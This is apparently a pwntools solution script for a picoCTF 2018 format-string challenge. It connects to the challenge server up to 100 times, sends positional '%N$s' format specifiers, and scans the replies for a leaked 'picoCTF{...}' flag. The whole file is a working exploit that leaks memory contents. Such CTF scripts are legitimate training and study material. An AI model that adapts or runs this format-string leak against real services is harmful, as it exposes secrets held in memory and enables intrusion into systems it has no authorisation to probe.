#! /usr/bin/python

from pwn import *
import re

host, port = "2018shell.picoctf.com", 57169

local = False
context.log_level="critical"

responses = ""
for i in range(100):
	if local:
		con = process("./echo")
	else:
		con = remote(host, port)

	try:
		con.recvuntil("> ")
		con.sendline("%"+str(i) +"$s")
		resp = con.recv()
		#print resp
		if "picoCTF" in resp:
			print re.findall(r"picoCTF{.*}", resp)[0]
			break
	except:
		print "EOF"
		continue
	con.close()

